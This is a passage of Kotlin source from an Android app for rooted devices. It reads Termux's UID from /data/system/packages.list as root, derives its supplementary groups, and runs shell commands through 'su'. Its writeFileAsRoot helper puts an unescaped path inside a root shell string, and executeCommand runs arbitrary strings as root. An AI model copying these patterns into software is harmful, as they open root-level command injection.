                            if (rootError.isNotBlank()) diagnostics.appendLine("   Error: $rootError\n")
                            runOnUiThread { textView.text = diagnostics.toString() }
                            return@Thread
                        }
                    } catch (e: Exception) {
                        diagnostics.appendLine("   ❌ FAILED: ${e.message}\n")
                        runOnUiThread { textView.text = diagnostics.toString() }
                        return@Thread
                    }
                    
                    // Step 3: Calculate standard Android groups
                    diagnostics.appendLine("3. Calculating standard Android groups for UID $termuxAppId...")
                    val appId = termuxAppId - 10000  // Extract app number (e.g., 10321 -> 321)
                    
                    diagnostics.appendLine("   App ID: $appId")
                    diagnostics.appendLine("   Primary UID/GID: $termuxAppId")
                    diagnostics.appendLine("   Supplementary groups:")
                    diagnostics.appendLine("     - 3003 (inet - network access)")
                    diagnostics.appendLine("     - 9997 (everybody)")
                    diagnostics.appendLine("     - ${20000 + appId} (cache group)")
                    diagnostics.appendLine("     - ${50000 + appId} (all group)")
                    
                    val calculatedGid = termuxAppId.toString()
                    val supplementaryGroups = listOf(
                        "3003",
                        "9997",
                        (20000 + appId).toString(),
                        (50000 + appId).toString()
                    )
                    val calculatedGroups = supplementaryGroups.joinToString(" ") { "-G $it" }
                    
                    diagnostics.appendLine("\n   Formatted command line groups: $calculatedGroups\n")
                    
                    // Step 4: Verify by running 'id' command
                    diagnostics.appendLine("4. Verifying by running 'id' as Termux UID...")
                    try {
                        val proc = Runtime.getRuntime().exec(arrayOf("su", termuxAppId.toString(), "-c", "id"))
                        val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
                        val error = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
                        val exitCode = proc.waitFor()
                        
                        diagnostics.appendLine("   Exit code: $exitCode")
                        
                        if (output.isNotBlank()) {
                            diagnostics.appendLine("   Output: ${output.trim()}")
                            
                            // Parse actual groups to compare
                            val groupsMatch = Regex("""groups=([^\s]+)""").find(output)
                            if (groupsMatch != null) {
                                val actualGroups = groupsMatch.groupValues[1]
                                diagnostics.appendLine("\n   Actual groups from 'id': $actualGroups")
                                
                                // Check if our calculated groups match
                                val allMatch = supplementaryGroups.all { actualGroups.contains(it) }
                                if (allMatch) {
                                    diagnostics.appendLine("   ✅ Calculated groups match actual groups!")
                                } else {
                                    diagnostics.appendLine("   ⚠️ Some calculated groups differ from actual")
                                }
                            }
                        } else {
                            diagnostics.appendLine("   Output: (empty)")
                        }
                        
                        if (error.isNotBlank()) {
                            diagnostics.appendLine("   Error: ${error.trim()}")
                        }
                        
                        diagnostics.appendLine()
                        
                        if (exitCode == 0) {
                            diagnostics.appendLine("✅ ALL CHECKS PASSED!")
                            diagnostics.appendLine("\n=== VALUES THAT WILL BE USED ===")
                            diagnostics.appendLine("UID: $termuxAppId")
                            diagnostics.appendLine("GID: $calculatedGid")
                            diagnostics.appendLine("Groups: ${supplementaryGroups.joinToString(", ")}")
                            diagnostics.appendLine("Command format: su $termuxAppId -g $calculatedGid $calculatedGroups -c 'command'")
                            diagnostics.appendLine("\n✅ These values will be used by Buttons 1-3")
                        } else {
                            diagnostics.appendLine("❌ 'id' command failed, but calculated values should still work")
                        }
                        
                    } catch (e: Exception) {
                        diagnostics.appendLine("   ❌ Exception: ${e.message}")
                        diagnostics.appendLine("   Stack trace:")
                        diagnostics.appendLine(e.stackTraceToString())
                    }
                    
                    runOnUiThread {
                        textView.text = diagnostics.toString()
                    }
                    
                } catch (e: Exception) {
                    runOnUiThread { textView.text = "Error running diagnostics: ${e.message}\n${e.stackTraceToString()}" }
                }
            }.start()
        }
    }

    /**
     * Detects Termux UID, GID, and groups by reading packages.list
     * and calculating standard Android supplementary groups.
     */
    private fun detectTermuxIds() {
        Thread {
            try {
                // Get Termux UID from packages.list
                val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep com.termux /data/system/packages.list"))
                val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
                val listExit = listProc.waitFor()
                
                if (listExit != 0 || listOutput.isBlank()) {
                    return@Thread
                }
                
                // Format: com.termux 10321 0 /data/user/0/com.termux ...
                val parts = listOutput.trim().split("\\s+".toRegex())
                if (parts.size < 2) {
                    return@Thread
                }
                
                val termuxAppId = parts[1].toIntOrNull() ?: return@Thread
                
                termuxUid = termuxAppId.toString()
                termuxGid = termuxAppId.toString()
                
                // Calculate standard Android supplementary groups
                // 3003 = inet (network access)
                // 9997 = everybody
                // 20000 + app_id = cache group
                // 50000 + app_id = all group
                val appId = termuxAppId - 10000  // Extract app number (e.g., 10321 -> 321)
                val supplementaryGroups = listOf(
                    "3003",           // inet - network access
                    "9997",           // everybody
                    (20000 + appId).toString(),  // cache group (e.g., 20321)
                    (50000 + appId).toString()   // all group (e.g., 50321)
                )
                
                termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }
            } catch (e: Exception) {
                // Silent failure - will be caught later when trying to use these values
            }
        }.start()
    }

    /**
     * Ensures Termux IDs are detected. If not, attempts detection synchronously.
     * Returns a pair: (success: Boolean, errorMessage: String?)
     */
    private fun ensureTermuxIdsDetected(): Pair<Boolean, String?> {
        if (termuxUid.isNotEmpty() && termuxGid.isNotEmpty() && termuxGroups.isNotEmpty()) {
            return Pair(true, null)
        }
        
        try {
            // Get Termux UID from packages.list
            val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep com.termux /data/system/packages.list"))
            val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
            val listError = BufferedReader(InputStreamReader(listProc.errorStream)).use { it.readText() }
            val listExit = listProc.waitFor()
            
            if (listExit != 0) {
                return Pair(false, "Failed to read packages.list (exit: $listExit)\nError: $listError")
            }
            
            if (listOutput.isBlank()) {
                return Pair(false, "Termux not found in packages.list. Is Termux installed?")
            }
            
            // Format: com.termux 10321 0 /data/user/0/com.termux ...
            val parts = listOutput.trim().split("\\s+".toRegex())
            if (parts.size < 2) {
                return Pair(false, "Invalid format in packages.list:\n$listOutput")
            }
            
            val termuxAppId = parts[1].toIntOrNull()
            if (termuxAppId == null) {
                return Pair(false, "Could not parse UID from packages.list:\n$listOutput")
            }
            
            termuxUid = termuxAppId.toString()
            termuxGid = termuxAppId.toString()
            
            // Calculate standard Android supplementary groups
            // 3003 = inet (network access)
            // 9997 = everybody
            // 20000 + app_id = cache group
            // 50000 + app_id = all group
            val appId = termuxAppId - 10000  // Extract app number (e.g., 10321 -> 321)
            val supplementaryGroups = listOf(
                "3003",           // inet - network access
                "9997",           // everybody
                (20000 + appId).toString(),  // cache group (e.g., 20321)
                (50000 + appId).toString()   // all group (e.g., 50321)
            )
            
            termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }
            
            return Pair(true, null)
            
        } catch (e: Exception) {
            return Pair(false, "Exception during detection: ${e.message}\n${e.stackTraceToString()}")
        }
    }

    private fun writeFileAsRoot(path: String, content: String) {
        val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", "cat > '$path'"))
        OutputStreamWriter(proc.outputStream).use { writer ->
            writer.write(content)
            writer.flush()
        }
        proc.outputStream.close()

        val stderr = BufferedReader(InputStreamReader(proc.errorStream)).use { it.readText() }
        val stdout = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
        val code = proc.waitFor()
        if (code != 0) throw RuntimeException("writeFileAsRoot failed ($code)\n$stderr\n$stdout")
    }

    private fun execAsRoot(cmd: String) {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", cmd))
        val err = BufferedReader(InputStreamReader(p.errorStream)).use { it.readText() }
        val out = BufferedReader(InputStreamReader(p.inputStream)).use { it.readText() }
        val code = p.waitFor()
        if (code != 0) throw RuntimeException("su -mm -c failed ($code)\n$err\n$out")
    }

    private fun executeCommand(command: String, textView: TextView) {
        Thread {
            try {
                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
                val output = BufferedReader(InputStreamReader(process.inputStream)).use { it.readText() }
                val errorOutput = BufferedReader(InputStreamReader(process.errorStream)).use { it.readText() }
                val code = process.waitFor()
                runOnUiThread {
                    textView.text = when {
                        output.isNotBlank() -> output.trim()
                        errorOutput.isNotBlank() -> "Error (exit $code):\n$errorOutput"
                        else -> "No output"
                    }
                }
            } catch (ex: Exception) {
                runOnUiThread { textView.text = "Exception: ${ex.message}" }
            }
        }.start()
    }
}
